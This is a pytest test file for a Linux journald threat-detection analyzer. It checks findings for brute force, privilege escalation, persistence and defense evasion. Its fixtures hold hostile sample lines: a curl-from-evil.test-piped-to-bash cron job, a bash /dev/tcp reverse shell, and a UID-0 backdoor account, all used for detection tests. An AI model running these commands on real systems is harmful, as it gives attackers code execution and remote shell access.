"""Linux journald -> findings analyzer (journal_analysis.py).

Closes the Linux side of the Collection gap: the journal was collected raw but
nothing turned it into adjudicable findings. Mirrors the Windows
Invoke-EventLogAnalysis coverage (brute force, priv-esc, new account, persistence,
defense evasion) and asserts schema conformance so findings merge cleanly.
"""
import datetime
import json
import os
import subprocess
import sys

from conftest import LINUX_HUNT

sys.path.insert(0, LINUX_HUNT)
import journal_analysis as ja          # noqa: E402

sys.path.insert(0, os.path.join(os.path.dirname(LINUX_HUNT), "..", "reporting"))
import finding_schema                   # noqa: E402

TP_CLASS_SEV = ("High", "Critical")
BASE_US = 1_700_000_000_000_000          # a fixed epoch (microseconds) for tests


def rec(ident, message, offset_seconds=0):
    """Build one journald `-o json` record."""
    return {
        "SYSLOG_IDENTIFIER": ident,
        "MESSAGE": message,
        "__REALTIME_TIMESTAMP": str(BASE_US + offset_seconds * 1_000_000),
    }


def types(findings):
    return {f["Type"] for f in findings}


# ── individual detections ────────────────────────────────────────────────────
def test_ssh_brute_force_within_window():
    recs = [rec("sshd", "Failed password for invalid user admin from 9.9.9.9 port 1",
                offset_seconds=i) for i in range(6)]
    f = ja.analyze(recs, window_seconds=120, brute_threshold=5)
    bf = [x for x in f if x["Type"] == "SSH Brute Force"]
    assert bf and "9.9.9.9" in bf[0]["Target"]
    assert bf[0]["Severity"] == "High"
    assert "T1110" in bf[0]["MITRE"]


def test_ssh_brute_force_below_threshold_is_silent():
    recs = [rec("sshd", "Failed password for root from 9.9.9.9", offset_seconds=i)
            for i in range(3)]
    assert "SSH Brute Force" not in types(ja.analyze(recs, brute_threshold=5))


def test_brute_force_spread_outside_window_is_silent():
    # 6 failures but spread over an hour -> not a burst
    recs = [rec("sshd", "Failed password for root from 9.9.9.9", offset_seconds=i * 600)
            for i in range(6)]
    assert "SSH Brute Force" not in types(ja.analyze(recs, window_seconds=120,
                                                      brute_threshold=5))


def test_brute_force_then_root_logon_escalates_to_critical():
    recs = [rec("sshd", "Failed password for root from 9.9.9.9", offset_seconds=i)
            for i in range(6)]
    recs.append(rec("sshd", "Accepted password for root from 9.9.9.9 port 2",
                    offset_seconds=10))
    f = ja.analyze(recs, window_seconds=120, brute_threshold=5)
    bf = [x for x in f if x["Type"] == "SSH Brute Force"]
    assert bf and bf[0]["Severity"] == "Critical"


def test_remote_root_logon_flagged():
    f = ja.analyze([rec("sshd", "Accepted publickey for root from 8.8.8.8 port 22")])
    rl = [x for x in f if x["Type"] == "Remote Root Logon"]
    assert rl and "8.8.8.8" in rl[0]["Details"]
    assert "T1021.004" in rl[0]["MITRE"]


def test_sudo_not_in_sudoers():
    f = ja.analyze([rec("sudo", "evil : user NOT in sudoers ; TTY=pts/0 ; "
                                 "PWD=/home/evil ; USER=root ; COMMAND=/bin/bash")])
    assert "Unauthorized Sudo Attempt" in types(f)


def test_sudo_shell_command_flagged():
    f = ja.analyze([rec("sudo", "bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; "
                                 "COMMAND=/tmp/.x/payload.sh")])
    sc = [x for x in f if x["Type"] == "Suspicious Sudo Command"]
    assert sc and "T1548.003" in sc[0]["MITRE"]


def test_new_account_created():
    f = ja.analyze([rec("useradd", "new user: name=backdoor, UID=0, GID=0, "
                                    "home=/home/backdoor, shell=/bin/bash")])
    na = [x for x in f if x["Type"] == "New Account Created"]
    assert na and "T1136.001" in na[0]["MITRE"]


def test_service_in_writable_path():
    f = ja.analyze([rec("systemd", "Started evil.service - runs /tmp/implant")])
    assert "Suspicious Service Execution" in types(f)


def test_rmm_service_flagged():
    f = ja.analyze([rec("systemd", "Started anydesk.service - AnyDesk")])
    assert "Remote-Access Service" in types(f)


def test_cron_writable_path():
    f = ja.analyze([rec("CRON", "(root) CMD (/dev/shm/.beacon)")])
    assert "Suspicious Cron Job" in types(f)


def test_cron_runtime_dir_payload_fires():
    # attacker staging in /run (tmpfs) must NOT be a blindspot
    f = ja.analyze([rec("CRON", "(root) CMD (/run/.sysupd/beacon.sh)")])
    assert "Suspicious Cron Job" in types(f)


def test_cron_download_cradle_fires():
    f = ja.analyze([rec("CRON", "(root) CMD (curl -s http://evil.test/a | bash)")])
    assert "Suspicious Cron Job" in types(f)


def test_cron_bare_curl_is_not_flagged():
    # bare curl/wget is a legitimate-cron norm; left to network/C2 analysis
    f = ja.analyze([rec("CRON", "(root) CMD (/usr/bin/curl -fsS https://api.internal/health)")])
    assert "Suspicious Cron Job" not in types(f)


def test_service_runtime_payload_fires():
    f = ja.analyze([rec("systemd", "Started shady.service - launches /run/.x/agent.elf")])
    assert "Suspicious Service Execution" in types(f)


def test_benign_user_runtime_dir_not_flagged():
    # systemd's XDG runtime dir service references /run/user/<uid> — must stay silent
    f = ja.analyze([rec("systemd",
                        "Starting user-runtime-dir@1000.service - "
                        "User Runtime Directory /run/user/1000...")])
    assert "Suspicious Service Execution" not in types(f)


def test_apparmor_disabled_fires():
    f = ja.analyze([rec("kernel", "AppArmor: AppArmor disabled by boot time parameter")])
    assert "Mandatory Access Control Disabled" in types(f)


def test_apparmor_unconfined_audit_not_flagged():
    # routine audit record with profile="unconfined" must not look like a disable event
    f = ja.analyze([rec("audit", 'apparmor="STATUS" operation="profile_load" '
                                  'profile="unconfined" name="/usr/bin/foo"')])
    assert "Mandatory Access Control Disabled" not in types(f)


def test_reverse_shell_indicator():
    f = ja.analyze([rec("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")])
    rs = [x for x in f if x["Type"] == "Reverse Shell Indicator"]
    assert rs and rs[0]["Severity"] == "High"


def test_journal_vacuum_truncation():
    f = ja.analyze([rec("systemd-journald", "Vacuuming done, freed 1.0G of archived journals")])
    assert "Journal Log Truncation" in types(f)


def test_selinux_disabled():
    f = ja.analyze([rec("kernel", "SELinux:  Disabled at runtime.")])
    assert "Mandatory Access Control Disabled" in types(f)


def test_unsigned_kernel_module():
    f = ja.analyze([rec("kernel", "module verification failed: signature and/or "
                                   "required key missing - tainting kernel")])
    assert "Unsigned Kernel Module" in types(f)


def test_benign_journal_is_quiet():
    recs = [
        rec("systemd", "Started Session 3 of user alice."),
        rec("sshd", "Accepted password for alice from 10.0.0.50 port 5"),
        rec("sudo", "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; "
                    "COMMAND=/usr/bin/apt update"),
        rec("CRON", "(root) CMD (/usr/bin/certbot renew)"),
        rec("kernel", "usb 1-1: new high-speed USB device"),
    ]
    assert ja.analyze(recs) == []


# ── parsing + schema + CLI ───────────────────────────────────────────────────
def test_parse_skips_garbage_lines():
    text = "\n".join([
        json.dumps(rec("sshd", "Accepted publickey for root from 8.8.8.8")),
        "not json at all",
        "",
        json.dumps({"SYSLOG_IDENTIFIER": "kernel", "MESSAGE": "boot"}),
    ])
    recs = ja.parse_journal_text(text)
    assert len(recs) == 2


def test_findings_conform_to_schema():
    recs = [rec("sshd", "Failed password for root from 9.9.9.9", offset_seconds=i)
            for i in range(6)]
    recs += [rec("sudo", "x : user NOT in sudoers ; COMMAND=/bin/bash"),
             rec("useradd", "new user: name=bad")]
    findings = ja.analyze(recs)
    # findings are pre-adjudication (no Verdict yet)
    assert finding_schema.validate(findings, adjudicated=False) == []


def test_cli_writes_findings_file(tmp_path):
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    src = tmp_path / "journal.json"
    src.write_text("\n".join(
        json.dumps(rec("sshd", "Failed password for root from 9.9.9.9", offset_seconds=i))
        for i in range(6)))
    r = subprocess.run(
        [sys.executable, os.path.join(LINUX_HUNT, "journal_analysis.py"),
         "--report-dir", str(tmp_path), "--stamp", stamp, "--input", str(src), "--quiet"],
        capture_output=True, text=True)
    assert r.returncode == 0
    out = tmp_path / f"Journal_Findings_{stamp}.json"
    assert out.exists()
    data = json.loads(out.read_text())
    assert any(f["Type"] == "SSH Brute Force" for f in data)
